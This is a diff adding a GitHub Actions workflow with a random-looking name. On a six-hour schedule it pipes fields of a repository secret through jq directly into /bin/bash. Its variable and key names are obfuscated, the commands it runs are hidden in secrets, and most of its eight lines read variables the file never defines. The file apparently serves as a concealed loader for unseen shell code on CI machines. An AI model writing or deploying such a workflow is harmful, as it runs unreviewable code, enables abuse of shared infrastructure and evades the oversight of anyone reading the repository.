@@ -1,0 +1,25 @@
+name: jiangjingguotaiguofang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangjingguotaiguofang
+        env:
+          unefi7073: ${{ secrets.unefi7073 }}
+        run: |
+          echo $unefi7073 | jq -r .zwhs919 | /bin/bash
+          echo $fv6896 | jq -r .y33 | /bin/bash
+          echo $uqjad8 | jq -r .c29147 | /bin/bash
+          echo $hzmsx5892 | jq -r .yxcs76 | /bin/bash
+          echo $mqe5387 | jq -r .a7 | /bin/bash
+          echo $ip3754 | jq -r .q89 | /bin/bash
+          echo $cps2237 | jq -r .o64501 | /bin/bash
+          echo $j7526 | jq -r .atcx6075 | /bin/bash
+
